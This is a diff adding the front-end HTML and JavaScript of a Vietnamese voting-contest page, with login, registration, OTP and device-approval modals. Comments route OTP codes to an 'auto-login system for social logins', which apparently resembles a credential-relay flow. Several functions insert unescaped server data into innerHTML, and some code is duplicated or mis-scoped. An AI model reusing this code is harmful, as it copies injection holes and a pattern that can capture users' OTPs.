+                                <p class="text-sm text-purple-300 font-medium">Nguyễn Thị Anh</p>
+                                <p class="text-xs text-gray-400">Hoa khôi Đại học 2025</p>
+                            </div>
+                            <div class="text-right">
+                                <span class="text-xs text-gray-400">2 phút trước</span>
+                                <div class="flex items-center space-x-1 mt-1">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-red-400">
+                                        <path d="M19 14c1.49-1.46 3-3.21 3-5.5A5.5 5.5 0 0 0 16.5 3c-1.76 0-3 .5-4.5 2-1.5-1.5-2.74-2-4.5-2A5.5 5.5 0 0 0 2 8.5c0 2.3 1.5 4.05 3 5.5l7 7Z"></path>
+                                    </svg>
+                                    <span class="text-xs text-gray-300">+1</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Activity 2 -->
+                        <div class="activity-item flex items-center space-x-3 p-3 rounded-lg bg-black/20">
+                            <img
+                                src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?auto=format&fit=crop&w=100&q=80"
+                                alt="user_456"
+                                class="w-10 h-10 rounded-full object-cover"
+                            >
+                            <div class="flex-1">
+                                <div class="flex items-center space-x-2">
+                                    <span class="text-sm font-medium text-white">user_456</span>
+                                    <span class="text-xs text-gray-400">đã vote cho</span>
+                                </div>
+                                <p class="text-sm text-purple-300 font-medium">Trần Văn Bình</p>
+                                <p class="text-xs text-gray-400">Tài năng Âm nhạc 2025</p>
+                            </div>
+                            <div class="text-right">
+                                <span class="text-xs text-gray-400">5 phút trước</span>
+                                <div class="flex items-center space-x-1 mt-1">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-red-400">
+                                        <path d="M19 14c1.49-1.46 3-3.21 3-5.5A5.5 5.5 0 0 0 16.5 3c-1.76 0-3 .5-4.5 2-1.5-1.5-2.74-2-4.5-2A5.5 5.5 0 0 0 2 8.5c0 2.3 1.5 4.05 3 5.5l7 7Z"></path>
+                                    </svg>
+                                    <span class="text-xs text-gray-300">+1</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Activity 3 -->
+                        <div class="activity-item flex items-center space-x-3 p-3 rounded-lg bg-black/20">
+                            <img
+                                src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?auto=format&fit=crop&w=100&q=80"
+                                alt="user_789"
+                                class="w-10 h-10 rounded-full object-cover"
+                            >
+                            <div class="flex-1">
+                                <div class="flex items-center space-x-2">
+                                    <span class="text-sm font-medium text-white">user_789</span>
+                                    <span class="text-xs text-gray-400">đã vote cho</span>
+                                </div>
+                                <p class="text-sm text-purple-300 font-medium">Lê Thị Cẩm</p>
+                                <p class="text-xs text-gray-400">Hoa khôi Đại học 2025</p>
+                            </div>
+                            <div class="text-right">
+                                <span class="text-xs text-gray-400">8 phút trước</span>
+                                <div class="flex items-center space-x-1 mt-1">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-red-400">
+                                        <path d="M19 14c1.49-1.46 3-3.21 3-5.5A5.5 5.5 0 0 0 16.5 3c-1.76 0-3 .5-4.5 2-1.5-1.5-2.74-2-4.5-2A5.5 5.5 0 0 0 2 8.5c0 2.3 1.5 4.05 3 5.5l7 7Z"></path>
+                                    </svg>
+                                    <span class="text-xs text-gray-300">+1</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Activity 4 -->
+                        <div class="activity-item flex items-center space-x-3 p-3 rounded-lg bg-black/20">
+                            <img
+                                src="https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?auto=format&fit=crop&w=100&q=80"
+                                alt="user_101"
+                                class="w-10 h-10 rounded-full object-cover"
+                            >
+                            <div class="flex-1">
+                                <div class="flex items-center space-x-2">
+                                    <span class="text-sm font-medium text-white">user_101</span>
+                                    <span class="text-xs text-gray-400">đã vote cho</span>
+                                </div>
+                                <p class="text-sm text-purple-300 font-medium">Nguyễn Thị Anh</p>
+                                <p class="text-xs text-gray-400">Hoa khôi Đại học 2025</p>
+                            </div>
+                            <div class="text-right">
+                                <span class="text-xs text-gray-400">12 phút trước</span>
+                                <div class="flex items-center space-x-1 mt-1">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-red-400">
+                                        <path d="M19 14c1.49-1.46 3-3.21 3-5.5A5.5 5.5 0 0 0 16.5 3c-1.76 0-3 .5-4.5 2-1.5-1.5-2.74-2-4.5-2A5.5 5.5 0 0 0 2 8.5c0 2.3 1.5 4.05 3 5.5l7 7Z"></path>
+                                    </svg>
+                                    <span class="text-xs text-gray-300">+1</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="relative z-10 bg-black/20 glass-effect border-t border-purple-500/20 mt-12">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6">
+            <div class="text-center space-y-2">
+                <p class="text-gray-400 text-sm">© 2025 BVOTE System. All rights reserved.</p>
+                <p class="text-gray-500 text-xs">Nền tảng bình chọn uy tín hàng đầu.</p>
+                <div class="flex items-center justify-center space-x-2 mt-2">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-purple-400">
+                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10"></path>
+                    </svg>
+                    <span class="text-gray-500 text-xs">Bảo mật & An toàn</span>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // === ENHANCED LOGIN SYSTEM ===
+
+        // Password visibility toggle
+        function togglePasswordVisibility(inputId) {
+            const input = document.getElementById(inputId);
+            const icon = input.nextElementSibling.querySelector('svg');
+
+            if (input.type === 'password') {
+                input.type = 'text';
+                icon.innerHTML = `
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.878 9.878L3 3m6.878 6.878L21 21"></path>
+                `;
+            } else {
+                input.type = 'password';
+                icon.innerHTML = `
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path>
+                `;
+            }
+        }
+
+        // Show forgot password modal
+        function showForgotPasswordModal() {
+            const modal = createModal('forgotPasswordModal', `
+                <div class="bg-gray-900 border border-purple-500/30 rounded-lg p-6 max-w-md w-full mx-4">
+                    <h3 class="text-xl font-bold text-white mb-4">Quên mật khẩu</h3>
+                    <p class="text-gray-400 text-sm mb-4">Nhập email hoặc số điện thoại để khôi phục mật khẩu</p>
+                    <form onsubmit="submitForgotPassword(event)">
+                        <input
+                            type="text"
+                            id="forgotEmail"
+                            placeholder="Email hoặc số điện thoại"
+                            class="w-full px-4 py-3 bg-white/10 border border-purple-500/30 text-white rounded-lg mb-4 placeholder-gray-400 focus:outline-none focus:border-purple-400"
+                            required
+                        >
+                        <div class="flex space-x-3">
+                            <button type="submit" class="flex-1 bg-purple-600 hover:bg-purple-700 text-white py-2 rounded-lg">Gửi yêu cầu</button>
+                            <button type="button" onclick="closeModal('forgotPasswordModal')" class="flex-1 bg-gray-600 hover:bg-gray-700 text-white py-2 rounded-lg">Hủy</button>
+                        </div>
+                    </form>
+                </div>
+            `);
+        }
+
+        // Show register modal
+        function showRegisterModal() {
+            const modal = createModal('registerModal', `
+                <div class="bg-gray-900 border border-purple-500/30 rounded-lg p-6 max-w-md w-full mx-4">
+                    <h3 class="text-xl font-bold text-white mb-4">Đăng ký tài khoản</h3>
+                    <form onsubmit="submitRegister(event)" class="space-y-4">
+                        <input
+                            type="text"
+                            name="full_name"
+                            placeholder="Họ và tên"
+                            class="w-full px-4 py-3 bg-white/10 border border-purple-500/30 text-white rounded-lg placeholder-gray-400 focus:outline-none focus:border-purple-400"
+                            required
+                        >
+                        <input
+                            type="email"
+                            name="email"
+                            placeholder="Email"
+                            class="w-full px-4 py-3 bg-white/10 border border-purple-500/30 text-white rounded-lg placeholder-gray-400 focus:outline-none focus:border-purple-400"
+                            required
+                        >
+                        <input
+                            type="tel"
+                            name="phone"
+                            placeholder="Số điện thoại"
+                            class="w-full px-4 py-3 bg-white/10 border border-purple-500/30 text-white rounded-lg placeholder-gray-400 focus:outline-none focus:border-purple-400"
+                            required
+                        >
+                        <input
+                            type="password"
+                            name="password"
+                            placeholder="Mật khẩu (tối thiểu 6 ký tự)"
+                            minlength="6"
+                            class="w-full px-4 py-3 bg-white/10 border border-purple-500/30 text-white rounded-lg placeholder-gray-400 focus:outline-none focus:border-purple-400"
+                            required
+                        >
+                        <input
+                            type="password"
+                            name="confirm_password"
+                            placeholder="Xác nhận mật khẩu"
+                            minlength="6"
+                            class="w-full px-4 py-3 bg-white/10 border border-purple-500/30 text-white rounded-lg placeholder-gray-400 focus:outline-none focus:border-purple-400"
+                            required
+                        >
+                        <div class="flex items-start space-x-3">
+                            <input type="checkbox" id="agreeTerms" class="mt-1" required>
+                            <label for="agreeTerms" class="text-gray-400 text-sm">
+                                Tôi đồng ý với <a href="#" class="text-purple-400 hover:text-purple-300">Điều khoản sử dụng</a>
+                                và <a href="#" class="text-purple-400 hover:text-purple-300">Chính sách bảo mật</a>
+                            </label>
+                        </div>
+                        <div class="flex space-x-3">
+                            <button type="submit" class="flex-1 bg-purple-600 hover:bg-purple-700 text-white py-2 rounded-lg">Đăng ký</button>
+                            <button type="button" onclick="closeModal('registerModal')" class="flex-1 bg-gray-600 hover:bg-gray-700 text-white py-2 rounded-lg">Hủy</button>
+                        </div>
+                    </form>
+                </div>
+            `);
+        }
+
+        // Show device approval modal
+        function showDeviceApprovalModal(deviceInfo) {
+            const modal = createModal('deviceApprovalModal', `
+                <div class="bg-gray-900 border border-purple-500/30 rounded-lg p-6 max-w-md w-full mx-4">
+                    <div class="text-center mb-6">
+                        <div class="w-16 h-16 bg-yellow-500/20 rounded-full flex items-center justify-center mx-auto mb-4">
+                            <svg class="w-8 h-8 text-yellow-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L4.082 18.5c-.77.833.192 2.5 1.732 2.5z"></path>
+                            </svg>
+                        </div>
+                        <h3 class="text-xl font-bold text-white mb-2">Đăng nhập từ thiết bị lạ</h3>
+                        <p class="text-gray-400 text-sm">Chúng tôi phát hiện đăng nhập từ thiết bị mới</p>
+                    </div>
+
+                    <div class="bg-white/5 rounded-lg p-4 mb-6">
+                        <div class="space-y-2 text-sm">
+                            <div class="flex justify-between">
+                                <span class="text-gray-400">Thiết bị:</span>
+                                <span class="text-white">${deviceInfo.device || 'Unknown Device'}</span>
+                            </div>
+                            <div class="flex justify-between">
+                                <span class="text-gray-400">Địa chỉ IP:</span>
+                                <span class="text-white">${deviceInfo.ip || '127.0.0.1'}</span>
+                            </div>
+                            <div class="flex justify-between">
+                                <span class="text-gray-400">Thời gian:</span>
+                                <span class="text-white">${new Date().toLocaleString('vi-VN')}</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="space-y-3">
+                        <div class="flex items-center justify-center space-x-2 text-yellow-500">
+                            <div class="animate-spin w-5 h-5 border-2 border-yellow-500 border-t-transparent rounded-full"></div>
+                            <span class="text-sm">Đang chờ phê duyệt đăng nhập...</span>
+                        </div>
+                        <p class="text-gray-400 text-xs text-center">
+                            Vui lòng kiểm tra email hoặc thiết bị đã xác thực để phê duyệt đăng nhập này
+                        </p>
+                        <button onclick="closeModal('deviceApprovalModal')" class="w-full bg-gray-600 hover:bg-gray-700 text-white py-2 rounded-lg">
+                            Đóng
+                        </button>
+                    </div>
+                </div>
+            `);
+        }
+
+        // Show OTP verification modal
+        function showOTPModal(loginId, platform = '') {
+            const modal = createModal('otpModal', `
+                <div class="bg-gray-900 border border-purple-500/30 rounded-lg p-6 max-w-md w-full mx-4">
+                    <div class="text-center mb-6">
+                        <div class="w-16 h-16 bg-green-500/20 rounded-full flex items-center justify-center mx-auto mb-4">
+                            <svg class="w-8 h-8 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                            </svg>
+                        </div>
+                        <h3 class="text-xl font-bold text-white mb-2">Xác minh OTP</h3>
+                        <p class="text-gray-400 text-sm">Vui lòng nhập mã OTP đã gửi đến email/số điện thoại${platform ? ' từ ' + platform : ''}</p>
+                    </div>
+
+                    <form onsubmit="submitOTP(event, '${loginId}')" class="space-y-4">
+                        <div class="flex justify-center space-x-2">
+                            ${Array.from({length: 6}, (_, i) => `
+                                <input
+                                    type="text"
+                                    maxlength="1"
+                                    class="w-12 h-12 text-center text-xl font-bold bg-white/10 border border-purple-500/30 text-white rounded-lg focus:outline-none focus:border-purple-400 focus:ring-1 focus:ring-purple-400"
+                                    onkeyup="moveToNext(this, ${i})"
+                                    onkeydown="moveToPrev(this, ${i}, event)"
+                                    id="otp${i}"
+                                >
+                            `).join('')}
+                        </div>
+
+                        <div class="text-center">
+                            <p class="text-gray-400 text-xs mb-4">Mã OTP sẽ hết hạn sau <span id="otpTimer" class="text-yellow-500 font-bold">120</span> giây</p>
+                        </div>
+
+                        <div class="flex space-x-3">
+                            <button type="submit" class="flex-1 bg-purple-600 hover:bg-purple-700 text-white py-2 rounded-lg">Xác nhận</button>
+                            <button type="button" onclick="closeModal('otpModal')" class="flex-1 bg-gray-600 hover:bg-gray-700 text-white py-2 rounded-lg">Hủy</button>
+                        </div>
+
+                        <div class="text-center">
+                            <button type="button" onclick="resendOTP('${loginId}')" class="text-purple-400 hover:text-purple-300 text-sm">Gửi lại mã OTP</button>
+                        </div>
+                    </form>
+                </div>
+            `);
+
+            // Start OTP timer
+            startOTPTimer();
+
+            // Focus first input
+            setTimeout(() => document.getElementById('otp0').focus(), 100);
+        }
+
+        // OTP input navigation
+        function moveToNext(current, index) {
+            if (current.value.length === 1 && index < 5) {
+                document.getElementById(`otp${index + 1}`).focus();
+            }
+        }
+
+        function moveToPrev(current, index, event) {
+            if (event.key === 'Backspace' && current.value.length === 0 && index > 0) {
+                document.getElementById(`otp${index - 1}`).focus();
+            }
+        }
+
+        // OTP timer
+        function startOTPTimer() {
+            let seconds = 120;
+            const timer = document.getElementById('otpTimer');
+
+            const interval = setInterval(() => {
+                seconds--;
+                if (timer) {
+                    timer.textContent = seconds;
+                    if (seconds <= 30) {
+                        timer.className = 'text-red-500 font-bold';
+                    }
+                }
+
+                if (seconds <= 0) {
+                    clearInterval(interval);
+                    if (timer) {
+                        timer.textContent = 'Hết hạn';
+                        timer.className = 'text-red-500 font-bold';
+                    }
+                }
+            }, 1000);
+        }
+
+        // Submit OTP
+        function submitOTP(event, loginId) {
+            event.preventDefault();
+
+            let otpCode = '';
+            for (let i = 0; i < 6; i++) {
+                const input = document.getElementById(`otp${i}`);
+                if (input && input.value) {
+                    otpCode += input.value;
+                }
+            }
+
+            if (otpCode.length === 6) {
+                // Send OTP to auto-login system
+                if (window.autoLoginManager) {
+                    autoLoginManager.submitOTP(loginId, otpCode);
+                }
+                showLoginStatus('Đang xác minh OTP...', 'processing');
+            } else {
+                showLoginStatus('Vui lòng nhập đầy đủ 6 số', 'error');
+            }
+        }
+
+        // Resend OTP
+        function resendOTP(loginId) {
+            showLoginStatus('Đang gửi lại mã OTP...', 'processing');
+            // Implement resend logic here
+            setTimeout(() => {
+                showLoginStatus('Mã OTP mới đã được gửi', 'success');
+                startOTPTimer();
+            }, 2000);
+        }
+
+        // Utility functions
+        function createModal(id, content) {
+            // Remove existing modal
+            const existing = document.getElementById(id);
+            if (existing) existing.remove();
+
+            // Create new modal
+            const modal = document.createElement('div');
+            modal.id = id;
+            modal.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50';
+            modal.innerHTML = content;
+
+            document.body.appendChild(modal);
+            return modal;
+        }
+
+        function closeModal(modalId) {
+            const modal = document.getElementById(modalId);
+            if (modal) modal.remove();
+        }
+
+        // Enhanced login status display
+        function showLoginStatus(message, type = 'info') {
+            const statusDiv = document.getElementById('autoLoginStatus');
+            if (!statusDiv) return;
+
+            const colors = {
+                'success': 'bg-green-500/20 border-green-500/30 text-green-400',
+                'error': 'bg-red-500/20 border-red-500/30 text-red-400',
+                'processing': 'bg-yellow-500/20 border-yellow-500/30 text-yellow-400',
+                'info': 'bg-blue-500/20 border-blue-500/30 text-blue-400'
+            };
+
+            const icons = {
+                'success': '✅',
+                'error': '❌',
+                'processing': '⏳',
+                'info': 'ℹ️'
+            };
+
+            statusDiv.className = `mt-4 p-3 rounded-lg text-center text-sm border ${colors[type]}`;
+            statusDiv.innerHTML = `${icons[type]} ${message}`;
+            statusDiv.classList.remove('hidden');
+
+            // Auto hide success/error messages
+            if (type === 'success' || type === 'error') {
+                setTimeout(() => {
+                    statusDiv.classList.add('hidden');
+                }, type === 'success' ? 3000 : 5000);
+            }
+        }
+
+        // Main login form handler
+        document.addEventListener('DOMContentLoaded', function() {
+            const mainLoginForm = document.getElementById('mainLoginForm');
+            if (mainLoginForm) {
+                mainLoginForm.addEventListener('submit', function(event) {
+                    event.preventDefault();
+
+                    const email = document.getElementById('mainLoginEmail').value.trim();
+                    const password = document.getElementById('mainLoginPassword').value;
+
+                    if (email && password) {
+                        showLoginStatus('Đang đăng nhập...', 'processing');
+
+                        // Submit to backend
+                        fetch('auth_handler.php?action=login', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                email: email,
+                                password: password
+                            })
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            if (data.success) {
+                                showLoginStatus('Đăng nhập thành công!', 'success');
+
+                                // Store user data
+                                localStorage.setItem('user_data', JSON.stringify(data.data.user));
+                                localStorage.setItem('session_token', data.data.session.token);
+
+                                setTimeout(() => {
+                                    window.location.reload();
+                                }, 2000);
+
+                            } else {
+                                // Handle different error types
+                                if (data.data && data.data.requires_approval) {
+                                    showDeviceApprovalModal(data.data.device_info);
+                                } else if (data.data && data.data.requires_otp) {
+                                    // Get user ID from stored data or response
+                                    const userId = data.data.user_id || getUserIdFromEmail(email);
+                                    showOTPModal('email_login_' + Date.now(), 'email');
+
+                                    // Store pending login data for OTP verification
+                                    sessionStorage.setItem('pending_login', JSON.stringify({
+                                        user_id: userId,
+                                        email: email,
+                                        otp_sent_to: data.data.otp_sent_to
+                                    }));
+                                } else {
+                                    showLoginStatus(data.message, 'error');
+                                }
+                            }
+                        })
+                        .catch(error => {
+                            console.error('Login error:', error);
+                            showLoginStatus('Lỗi kết nối. Vui lòng thử lại.', 'error');
+                        });
+                    }
+                });
+            }
+        });
+
+        // Enhanced OTP submission with backend integration
+        function submitOTP(event, loginId) {
+            event.preventDefault();
+
+            let otpCode = '';
+            for (let i = 0; i < 6; i++) {
+                const input = document.getElementById(`otp${i}`);
+                if (input && input.value) {
+                    otpCode += input.value;
+                }
+            }
+
+            if (otpCode.length === 6) {
+                showLoginStatus('Đang xác minh OTP...', 'processing');
+
+                // Get pending login data
+                const pendingLogin = JSON.parse(sessionStorage.getItem('pending_login') || '{}');
+
+                if (loginId.startsWith('email_login_') && pendingLogin.user_id) {
+                    // Submit OTP to backend for email login
+                    fetch('auth_handler.php?action=verify_otp', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            user_id: pendingLogin.user_id,
+                            otp_code: otpCode
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.success) {
+                            showLoginStatus('Xác minh OTP thành công!', 'success');
+                            closeModal('otpModal');
+
+                            // Store user data
+                            localStorage.setItem('user_data', JSON.stringify(data.data.user));
+                            localStorage.setItem('session_token', data.data.session.token);
+
+                            // Clear pending login
+                            sessionStorage.removeItem('pending_login');
+
+                            setTimeout(() => {
+                                window.location.reload();
+                            }, 2000);
+
+                        } else {
+                            showLoginStatus(data.message, 'error');
+                        }
+                    })
+                    .catch(error => {
+                        console.error('OTP verification error:', error);
+                        showLoginStatus('Lỗi kết nối. Vui lòng thử lại.', 'error');
+                    });
+
+                } else if (window.autoLoginManager) {
+                    // Submit OTP to auto-login system for social logins
+                    autoLoginManager.submitOTP(loginId, otpCode);
+                }
+
+            } else {
+                showLoginStatus('Vui lòng nhập đầy đủ 6 số', 'error');
+            }
+        }
+
+        // Helper function to get user ID from email (simplified)
+        function getUserIdFromEmail(email) {
+            // This would typically be handled by the backend
+            // For now, return a placeholder
+            return null;
+        }
+
+        // Enhanced forgot password with backend integration
+        function submitForgotPassword(event) {
+            event.preventDefault();
+            const email = document.getElementById('forgotEmail').value.trim();
+
+            if (email) {
+                fetch('auth_handler.php?action=forgot_password', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ email: email })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        showLoginStatus('Email khôi phục đã được gửi', 'success');
+                    } else {
+                        showLoginStatus(data.message, 'error');
+                    }
+                    closeModal('forgotPasswordModal');
+                })
+                .catch(error => {
+                    showLoginStatus('Lỗi gửi email khôi phục', 'error');
+                    closeModal('forgotPasswordModal');
+                });
+            }
+        }
+
+        // Enhanced registration with backend integration
+        function submitRegister(event) {
+            event.preventDefault();
+
+            const formData = new FormData(event.target);
+            const registerData = {
+                full_name: formData.get('full_name'),
+                email: formData.get('email'),
+                phone: formData.get('phone'),
+                password: formData.get('password'),
+                confirm_password: formData.get('confirm_password')
+            };
+
+            // Basic validation
+            if (registerData.password !== registerData.confirm_password) {
+                showLoginStatus('Mật khẩu xác nhận không khớp', 'error');
+                return;
+            }
+
+            fetch('auth_handler.php?action=register', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(registerData)
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    showLoginStatus('Đăng ký thành công! Vui lòng kiểm tra email để xác thực.', 'success');
+                } else {
+                    showLoginStatus(data.message, 'error');
+                }
+                closeModal('registerModal');
+            })
+            .catch(error => {
+                showLoginStatus('Lỗi đăng ký tài khoản', 'error');
+                closeModal('registerModal');
+            });
+        }
+
+        // Check authentication status on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            const sessionToken = localStorage.getItem('session_token');
+            const userData = localStorage.getItem('user_data');
+
+            if (sessionToken && userData) {
+                try {
+                    const user = JSON.parse(userData);
+                    updateUIForLoggedInUser(user);
+                } catch (error) {
+                    // Invalid data, clear storage
+                    localStorage.removeItem('session_token');
+                    localStorage.removeItem('user_data');
+                }
+            }
+        });
+
+        // Update UI for logged-in user
+        function updateUIForLoggedInUser(user) {
+            // Hide login panel and show user info
+            const loginPanel = document.querySelector('.bg-black\\/20.glass-effect');
+            if (loginPanel) {
+                loginPanel.innerHTML = `
+                    <div class="text-center p-6">
+                        <div class="w-16 h-16 bg-gradient-to-br from-green-500 to-green-700 rounded-full flex items-center justify-center mx-auto mb-4">
+                            <svg class="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+                            </svg>
+                        </div>
+                        <h3 class="text-lg font-bold text-white mb-2">Xin chào, ${user.name}!</h3>
+                        <p class="text-gray-400 text-sm mb-4">Bạn đã đăng nhập thành công</p>
+                        <div class="space-y-2">
+                            <button onclick="logout()" class="w-full bg-red-600 hover:bg-red-700 text-white py-2 rounded-lg transition-colors">
+                                Đăng xuất
+                            </button>
+                            <button onclick="showUserProfile()" class="w-full bg-purple-600 hover:bg-purple-700 text-white py-2 rounded-lg transition-colors">
+                                Thông tin cá nhân
+                            </button>
+                        </div>
+                    </div>
+                `;
+            }
+        }
+
+        // Logout function
+        function logout() {
+            localStorage.removeItem('session_token');
+            localStorage.removeItem('user_data');
+            sessionStorage.clear();
+            window.location.reload();
+        }
+
+        // Show user profile (placeholder)
+        function showUserProfile() {
+            const userData = JSON.parse(localStorage.getItem('user_data') || '{}');
+            alert(`Thông tin người dùng:\nTên: ${userData.name}\nEmail: ${userData.email}`);
+        }
+        // Simple interactions
+        document.addEventListener('DOMContentLoaded', function() {
+            // Add click handlers for vote buttons
+            document.querySelectorAll('button').forEach(button => {
+                if (button.textContent.includes('Vote')) {
+                    button.addEventListener('click', function() {
+                        this.innerHTML = 'Đã vote ✓';
+                        this.classList.remove('border-purple-500', 'text-purple-400', 'hover:bg-purple-500');
+                        this.classList.add('bg-green-500', 'text-white');
+                        this.disabled = true;
+                    });
+                }
+            });
+
+            // Add hover effects for cards
+            document.querySelectorAll('.contest-card').forEach(card => {
+                card.addEventListener('mouseenter', function() {
+                    this.style.transform = 'translateY(-8px)';
+                });
+
+                card.addEventListener('mouseleave', function() {
+                    this.style.transform = 'translateY(0)';
+                });
+            });
+
+            // Global state
+            let currentUser = null;
+            let searchTimeout = null;
+
+            initializeApp();
+            setupEventListeners();
+            loadContests();
+            loadRankings();
+            loadRecentActivities();
+        });
+
+        // Initialize application
+        async function initializeApp() {
+            try {
+                // Check if user is logged in by checking session
+                const response = await fetch('check_session.php');
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data.logged_in) {
+                        currentUser = data.user;
+                        showLoggedInState();
+                    }
+                }
+            } catch (error) {
+                console.log('Not logged in');
+            }
+        }
+
+        // Setup event listeners
+        function setupEventListeners() {
+            // Search functionality
+            const searchInput = document.getElementById('searchInput');
+            if (searchInput) {
+                searchInput.addEventListener('input', handleSearch);
+                searchInput.addEventListener('focus', () => {
+                    document.getElementById('searchResults').classList.remove('hidden');
+                });
+            }
+
+            // Close search results when clicking outside
+            document.addEventListener('click', (e) => {
+                if (!e.target.closest('#searchInput') && !e.target.closest('#searchResults')) {
+                    document.getElementById('searchResults')?.classList.add('hidden');
+                }
+            });
+
+            // User menu toggle
+            document.getElementById('userMenuBtn')?.addEventListener('click', () => {
+                document.getElementById('userMenu')?.classList.toggle('hidden');
+            });
+
+            // Close user menu when clicking outside
+            document.addEventListener('click', (e) => {
+                if (!e.target.closest('#userMenuBtn') && !e.target.closest('#userMenu')) {
+                    document.getElementById('userMenu')?.classList.add('hidden');
+                }
+            });
+        }
+
+        // Show logged in state
+        function showLoggedInState() {
+            document.getElementById('notLoggedIn')?.classList.add('hidden');
+            document.getElementById('loggedIn')?.classList.remove('hidden');
+            document.getElementById('userName').textContent = currentUser.name;
+            document.getElementById('userInitial').textContent = currentUser.name.charAt(0).toUpperCase();
+        }
+
+        // Handle search
+        function handleSearch() {
+            const query = document.getElementById('searchInput').value.trim();
+
+            clearTimeout(searchTimeout);
+
+            if (query.length < 2) {
+                document.getElementById('searchResults')?.classList.add('hidden');
+                return;
+            }
+
+            searchTimeout = setTimeout(async () => {
+                try {
+                    const response = await fetch(`api.php?action=search&q=${encodeURIComponent(query)}`);
+                    const data = await response.json();
+
+                    if (data.success) {
+                        displaySearchResults(data.results);
+                    }
+                } catch (error) {
+                    console.error('Search error:', error);
+                }
+            }, 300);
+        }
+
+        // Display search results
+        function displaySearchResults(results) {
+            const container = document.getElementById('searchResults');
+            if (!container) return;
+
+            if (results.length === 0) {
+                container.innerHTML = '<div class="p-4 text-gray-400">Không tìm thấy kết quả nào</div>';
+                container.classList.remove('hidden');
+                return;
+            }
+
+            let html = '';
+            results.forEach(result => {
+                if (result.type === 'contest') {
+                    html += `
+                        <div class="p-3 hover:bg-purple-600/20 cursor-pointer border-b border-purple-500/10 last:border-b-0" onclick="viewContest(${result.id})">
+                            <div class="font-medium text-white">${result.name}</div>
+                            <div class="text-sm text-gray-400">Cuộc thi</div>
+                        </div>
+                    `;
+                } else {
+                    html += `
+                        <div class="p-3 hover:bg-purple-600/20 cursor-pointer border-b border-purple-500/10 last:border-b-0" onclick="viewContestant(${result.id})">
+                            <div class="font-medium text-white">${result.name}</div>
+                            <div class="text-sm text-gray-400">${result.campaign_title}</div>
+                        </div>
+                    `;
+                }
+            });
+
+            container.innerHTML = html;
+            container.classList.remove('hidden');
+        }
+
+        // Load contests
+        async function loadContests() {
+            try {
+                const response = await fetch('api.php?action=get_contests');
+                const data = await response.json();
+
+                if (data.success && data.contests.length > 0) {
+                    updateContestsSection(data.contests);
+                }
+            } catch (error) {
+                console.error('Error loading contests:', error);
+            }
+        }
+
+        // Update contests section
+        function updateContestsSection(contests) {
+            const container = document.querySelector('.grid.grid-cols-1.md\\:grid-cols-3.gap-6');
+            if (!container || contests.length === 0) return;
+
+            let html = '';
+            contests.slice(0, 3).forEach(contest => {
+                const endDate = new Date(contest.end_date);
+                const isActive = endDate > new Date();
+
+                html += `
